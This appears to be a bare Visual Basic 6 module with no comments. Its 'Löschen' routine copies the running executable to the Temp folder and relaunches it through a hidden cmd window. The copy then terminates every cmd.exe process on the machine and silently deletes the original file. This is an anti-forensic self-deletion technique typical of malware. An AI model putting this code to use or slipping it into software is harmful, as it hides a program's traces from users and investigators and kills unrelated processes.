Attribute VB_Name = "Module6"
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Declare Function OpenProcess Lib "kernel32.dll" (ByVal dwDesiredAccess As Long, _
ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Declare Function ProcessFirst Lib "kernel32.dll" Alias "Process32First" (ByVal hSnapShot As Long, _
uProcess As PROCESSENTRY32) As Long
Declare Function ProcessNext Lib "kernel32.dll" Alias "Process32Next" (ByVal hSnapShot As Long, _
uProcess As PROCESSENTRY32) As Long
Declare Function CreateToolhelpSnapshot Lib "kernel32.dll" Alias "CreateToolhelp32Snapshot" ( _
ByVal lFlags As Long, lProcessID As Long) As Long
Declare Function TerminateProcess Lib "kernel32.dll" (ByVal ApphProcess As Long, _
ByVal uExitCode As Long) As Long
Declare Function CloseHandle Lib "kernel32.dll" (ByVal hObject As Long) As Long
Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type
Function GetAppFilename() As String
    Dim hModule As Long
    Dim buffer As String * 256
    hModule = GetModuleHandle(App.EXEName)
    GetModuleFileName hModule, buffer, Len(buffer)
    GetAppFilename = VBA.Left$(buffer, InStr(buffer & vbNullChar, vbNullChar) - 1)
End Function
Public Function Löschen()
Dim Apploc As String
Dim sYourCommand As String
If App.Path <> Environ("Temp") Then
FileCopy GetAppFilename, Environ("Temp") & "\" & "546746.tmp"
Apploc = GetAppFilename
Shell "cmd /k " & Environ("Temp") & "\" & "546746.tmp" & " " & Apploc, vbHide
End
End If
If App.Path = Environ("Temp") Then
If command$ <> "" Then
Apploc = command$
KillProcess "cmd.exe"
sYourCommand = "Del " & Chr(34) & Apploc & Chr(34)
Shell "cmd /c " & sYourCommand, vbHide
End If
End If
End Function
Public Sub KillProcess(NameProcess As String)
Const PROCESS_ALL_ACCESS = &H1F0FFF
Const TH32CS_SNAPPROCESS As Long = 2&
Dim uProcess  As PROCESSENTRY32
Dim RProcessFound As Long
Dim hSnapShot As Long
Dim SzExename As String
Dim ExitCode As Long
Dim MyProcess As Long
Dim AppKill As Boolean
Dim AppCount As Integer
Dim i As Integer
Dim WinDirEnv As String
       If NameProcess <> "" Then
          AppCount = 0
          uProcess.dwSize = Len(uProcess)
          hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
          RProcessFound = ProcessFirst(hSnapShot, uProcess)
          Do
            i = InStr(1, uProcess.szExeFile, Chr(0))
            SzExename = LCase$(VBA.Left$(uProcess.szExeFile, i - 1))
            WinDirEnv = Environ("Windir") + "\"
            WinDirEnv = LCase$(WinDirEnv)
            If Right$(SzExename, Len(NameProcess)) = LCase$(NameProcess) Then
               AppCount = AppCount + 1
               MyProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
               AppKill = TerminateProcess(MyProcess, ExitCode)
               Call CloseHandle(MyProcess)
            End If
            RProcessFound = ProcessNext(hSnapShot, uProcess)
          Loop While RProcessFound
          Call CloseHandle(hSnapShot)
       End If
End Sub

